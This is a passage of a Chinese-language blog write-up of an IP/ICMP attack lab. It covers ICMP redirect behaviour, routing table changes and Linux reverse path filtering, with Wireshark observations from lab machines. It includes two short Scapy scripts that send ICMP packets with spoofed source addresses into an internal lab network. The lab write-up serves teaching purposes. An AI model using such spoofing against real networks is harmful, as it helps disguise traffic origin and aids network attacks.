+<p> gw里面的IP并不在LAN网络里面，运行后发现，无法重定向到该主机、</p>
+<p> <img src="/2020/10/19/IP-ICMP-Attack-lab/task2-2.PNG" srcset="/img/loading.gif" alt="task2-2"></p>
+<p> 原因：重定向是为了能够最优化的穿过网络，使得流量能够更快的传递到目的地，参考<a href="https://www.cisco.com/c/zh_cn/support/docs/ios-nx-os-software/nx-os-software/213841-understanding-icmp-redirect-messages.html" target="_blank" rel="noopener">了解ICMP重定向消息</a>，而当gw所指向的目的网关/主机不在lan网络里面，肯定需要先通过我的默认网关之后进行绕行，这不符合重定向的本意</p>
+</li>
+<li><p>不能，将gw改为10.0.2.6，这是一台关机的电脑，运行结果</p>
+<p> <img src="/2020/10/19/IP-ICMP-Attack-lab/task2-3.PNG" srcset="/img/loading.gif" alt="task2-3"></p>
+<p> 可以看到仍然是通过了默认网关，原因是，10.0.2.6在关机状态没法进行接受并转发相应IP数据包的功能</p>
+</li>
+</ol>
+<h2 id="Task-3：路由和反向过滤"><a href="#Task-3：路由和反向过滤" class="headerlink" title="Task 3：路由和反向过滤"></a>Task 3：路由和反向过滤</h2><ol>
+<li><p>首先是对于路由表表项的理解，参考blog：</p>
+<p> <a href="https://stackoverflow.com/questions/8599424/understanding-routing-table-entry" target="_blank" rel="noopener">https://stackoverflow.com/questions/8599424/understanding-routing-table-entry</a> </p>
+<p> <a href="https://superuser.com/questions/347240/why-is-192-168-1-0-needed-in-route-table" target="_blank" rel="noopener">https://superuser.com/questions/347240/why-is-192-168-1-0-needed-in-route-table</a></p>
+<p> <a href="https://blog.csdn.net/yueyadao/article/details/86709503?biz_id=102&amp;utm_term=%E8%B7%AF%E7%94%B1%E8%A1%A8%E8%A1%A8%E9%A1%B9&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-0-86709503&amp;spm=1018.2118.3001.4187" target="_blank" rel="noopener">https://blog.csdn.net/yueyadao/article/details/86709503?biz_id=102&amp;utm_term=%E8%B7%AF%E7%94%B1%E8%A1%A8%E8%A1%A8%E9%A1%B9&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-0-86709503&amp;spm=1018.2118.3001.4187</a></p>
+<p> 在这里我的R上面的两个IP地址分别为10.0.2.5以及192.168.60.1，但是在A上面默认的发包的网关IP是10.0.2.1，调整表项</p>
+<p> <img src="/2020/10/19/IP-ICMP-Attack-lab/task3-1.PNG" srcset="/img/loading.gif" alt="task3-1"></p>
+<p> 之后在B上面ping A（10.0.2.4）结果如下</p>
+<p> <img src="/2020/10/19/IP-ICMP-Attack-lab/task3-2.PNG" srcset="/img/loading.gif" alt="task3-2"></p>
+<p> 在A上面ping B（192.168.60.5）注意路由表表项是有生存时间的</p>
+<p> <img src="/2020/10/19/IP-ICMP-Attack-lab/task3-3.PNG" srcset="/img/loading.gif" alt="task3-3"></p>
+<p> 在B上面telnet（TCP链接）A</p>
+<p> <img src="/2020/10/19/IP-ICMP-Attack-lab/task3-5.PNG" srcset="/img/loading.gif" alt="task3-5"></p>
+<p> 反之，在A上面telnet B</p>
+<p> <img src="/2020/10/19/IP-ICMP-Attack-lab/task3-4.PNG" srcset="/img/loading.gif" alt="task3-4"></p>
+</li>
+<li><p>首先是伪造属于10.0.2.0/24的IP地址，选择10.0.2.6作为src地址</p>
+<p> code如下：</p>
+ <pre><code class="hljs livecodeserver"><span class="hljs-comment">#!/usr/bin/python3</span>
+<span class="hljs-built_in">from</span> scapy.all import *
+
+<span class="hljs-keyword">a</span> = IP()
+<span class="hljs-keyword">a</span>.src = <span class="hljs-string">"10.0.2.6"</span>
+<span class="hljs-keyword">a</span>.dst = <span class="hljs-string">"192.168.60.5"</span>
+
+b = ICMP()
+p = <span class="hljs-keyword">a</span>/b
+<span class="hljs-built_in">send</span>(p)</code></pre>
+
+<p> 在R上面运行wireshark观察到的结果</p>
+<p> <img src="/2020/10/19/IP-ICMP-Attack-lab/task3-6.PNG" srcset="/img/loading.gif" alt="task3-6"></p>
+<p> 在分析是否进行转发到内部网络的时候，可以分析MAC地址，在两个ICMP报文中，可以看到他们的MAC地址发生了改变，第一个包的源MAC是A的MAC地址，但是会发现是no response found，之后紧接着下一个ICMP的报文的源MAC地址就是R上面的接入内部网络的MAC地址，所以会转发到内部网络</p>
+<p> <img src="/2020/10/19/IP-ICMP-Attack-lab/task3-7.PNG" srcset="/img/loading.gif" alt="task3-7"></p>
+<p> 在这里我们可以看到在内部网络里面的ICMP报文的源MAC地址是R上面其中一个接口的MAC地址</p>
+</li>
+<li><p>在这里我们伪造源IP地址为192.168.60.6，将上面code改一下即可</p>
+<p> 首先来看R的截图</p>
+<p> <img src="/2020/10/19/IP-ICMP-Attack-lab/task3-9.PNG" srcset="/img/loading.gif" alt="task3-9"></p>
+<p> 结合相关的反向路由的点</p>
+</li>
+</ol>
+<blockquote>
+<p>Linux kernel implements a filtering rule called reverse path filtering, which ensures the symmetric routing rule. When a packet with the source IP address X comes from an interface (say I), the OS will check whether the return packet will return from the same interface, i.e., whether the routing for packets going to X is symmetric. To check that, the OS conducts a reverse lookup, finds out which interface will be used to route the return packets back to X. If this interface is not I, i.e., different from where the original packet comes from, the routing path is asymmetric. In this case, the kernel will drop the packet可以</p>
+</blockquote>
+<p>​        可以分析出来在我们的spoofed的数据包发送到R的时候，由于return packet并不会从10.0.2.0/24的网络在R上的接口发出，所以这个包会被进行丢弃</p>
+<ol start="4">
+<li><p>伪造地址为1.2.3.4</p>
+<p> code如下</p>
+ <pre><code class="hljs livecodeserver"><span class="hljs-comment">#!/usr/bin/python3</span>
+<span class="hljs-built_in">from</span> scapy.all import *
+
+<span class="hljs-keyword">a</span> = IP()
+<span class="hljs-keyword">a</span>.src = <span class="hljs-string">"1.2.3.4"</span>
+<span class="hljs-keyword">a</span>.dst = <span class="hljs-string">"192.168.60.5"</span>
+
+b = ICMP()
+p = <span class="hljs-keyword">a</span>/b
+<span class="hljs-built_in">send</span>(p)</code></pre>
+
+<p> 之后在R上面运行wireshark抓包</p>
+<p> <img src="/2020/10/19/IP-ICMP-Attack-lab/task3-10.PNG" srcset="/img/loading.gif" alt="task3-10"></p>
+<p> 可以发现第一个ICMP的源MAC地址是A的MAC地址，第二个ICMP request的源MAC地址是R接入内部网络的接口的MAC地址，可以看到是转入到内部网络中了</p>
+<p> 结合路由表来分析原因可知，当IP.src为1.2.3.4的时候，发到的R的接口假设为R1，那么这个包的return packet的包也应该是从R1中发出，所以反向也应该是这个地址（猜想是即便在路由表中只有当是10.0.2.0/24的主机才会将IP包发过来，但是1.2.3.4也从R1发过来，所以回去的话也应该是这个端口发出）</p>
+<p> B上面wireshark的截图</p>
+<p> <img src="/2020/10/19/IP-ICMP-Attack-lab/task3-11.PNG" srcset="/img/loading.gif" alt="task3-11"></p>
+</li>
+</ol>
+<h2 id="回顾-amp-参考blog"><a href="#回顾-amp-参考blog" class="headerlink" title="回顾&amp;参考blog"></a>回顾&amp;参考blog</h2><p><a href="https://juejin.im/post/6844904049800642568#heading-15" target="_blank" rel="noopener">计算机网络协议架构详解</a></p>
+<p><a href="https://blog.csdn.net/weixin_34417183/article/details/92644501?biz_id=102&utm_term=IP%20Fragmentation%20and%20the%20relat&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-1-92644501&spm=1018.2118.3001.4187" target="_blank" rel="noopener">数据报分片</a></p>
+
+            </article>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/Network-Security/">Network Security</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" target="_blank" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！</p>
+              
+              
+                <div class="post-prevnext row">
+                  <div class="post-prev col-6">
+                    
+                    
+                      <a href="/2020/10/24/process-lab/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">process-lab</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </div>
+                  <div class="post-next col-6">
+                    
+                    
+                      <a href="/2020/10/18/ARP-Cache-Poisoning-Attack/">
+                        <span class="hidden-mobile">ARP-Cache-Poisoning-Attack</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </div>
+                </div>
+              
+            </div>
+
+            
+          </div>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div id="tocbot"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+  </main>
+
+  
+    <a id="scroll-top-button" href="#" role="button">
+      <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+    </a>
+  
+
+  
+    <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+  
+
+  
+
+  
+
+  <footer class="mt-5">
+  <div class="text-center py-3">
+    <div>
+      <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a>
+      <i class="iconfont icon-love"></i>
+      <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener">
+        <span>Fluid</span></a>
+    </div>
+    
+
+    
+
+    
+  </div>
+</footer>
+
+<!-- SCRIPTS -->
+<script  src="https://cdn.staticfile.org/jquery/3.4.1/jquery.min.js" ></script>
+<script  src="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/js/bootstrap.min.js" ></script>
+<script  src="/js/debouncer.js" ></script>
+<script  src="/js/main.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/lazyload.js" ></script>
+  
+
+
+
+  <script defer src="https://cdn.staticfile.org/clipboard.js/2.0.6/clipboard.min.js" ></script>
+  <script  src="/js/clipboard-use.js" ></script>
+
+
+
+
+
+
+
+  <script  src="https://cdn.staticfile.org/tocbot/4.11.1/tocbot.min.js" ></script>
+  <script>
+    $(document).ready(function () {
+      var boardCtn = $('#board-ctn');
+      var boardTop = boardCtn.offset().top;
+
+      tocbot.init({
+        tocSelector: '#tocbot',
+        contentSelector: 'article.markdown-body',
+        headingSelector: 'h1,h2,h3,h4,h5,h6',
+        linkClass: 'tocbot-link',
+        activeLinkClass: 'tocbot-active-link',
+        listClass: 'tocbot-list',
+        isCollapsedClass: 'tocbot-is-collapsed',
+        collapsibleClass: 'tocbot-is-collapsible',
+        collapseDepth: 0,
+        scrollSmooth: true,
+        headingsOffset: -boardTop
+      });
+      if ($('.toc-list-item').length > 0) {
+        $('#toc').css('visibility', 'visible');
+      }
+    });
+  </script>
+
+
+
+  <script  src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js" ></script>
+  <script>
+    var typed = new Typed('#subtitle', {
+      strings: [
+        '  ',
+        "IP/ICMP Attack lab&nbsp;",
+      ],
+      cursorChar: "_",
+      typeSpeed: 70,
+      loop: false,
+    });
+    typed.stop();
+    $(document).ready(function () {
+      $(".typed-cursor").addClass("h2");
+      typed.start();
+    });
+  </script>
+
+
+
+  <script  src="https://cdn.staticfile.org/anchor-js/4.2.2/anchor.min.js" ></script>
+  <script>
+    anchors.options = {
+      placement: "right",
+      visible: "hover",
+      
+    };
+    var el = "h1,h2,h3,h4,h5,h6".split(",");
+    var res = [];
+    for (item of el) {
+      res.push(".markdown-body > " + item)
+    }
+    anchors.add(res.join(", "))
+  </script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+  <script>
+    var path = "/local-search.xml";
+    var inputArea = document.querySelector("#local-search-input");
+    inputArea.onclick = function () {
+      searchFunc(path, 'local-search-input', 'local-search-result');
+      this.onclick = null
+    }
+  </script>
+
+
+
+  <script  src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+  <script>
+    $('#post img:not(.no-zoom img, img[no-zoom]), img[zoom]').each(
+      function () {
+        var element = document.createElement('a');
+        $(element).attr('data-fancybox', 'images');
+        $(element).attr('href', $(this).attr('src'));
+        $(this).wrap(element);
+      }
+    );
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</body>
+</html>
